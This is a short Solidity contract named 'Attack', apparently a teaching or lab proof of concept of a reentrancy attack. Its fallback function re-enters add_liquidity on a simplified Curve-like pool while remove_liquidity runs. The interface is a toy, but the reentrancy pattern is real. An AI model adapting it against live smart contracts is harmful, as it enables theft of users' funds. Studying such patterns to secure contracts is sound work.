// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

interface CurveContract {
    function add_liquidity() external payable;

    function remove_liquidity() external;
}

contract Attack {
    CurveContract public curve;

    constructor(address _curveContract) {
        curve = CurveContract(_curveContract);
    }

    function attack() external payable {
        require(msg.value > 1000000, "Incorrect value sent with the transaction");
        payable(address(curve)).transfer(100000);
        curve.remove_liquidity();
    }

    fallback() external {
        curve.add_liquidity();
    }
}
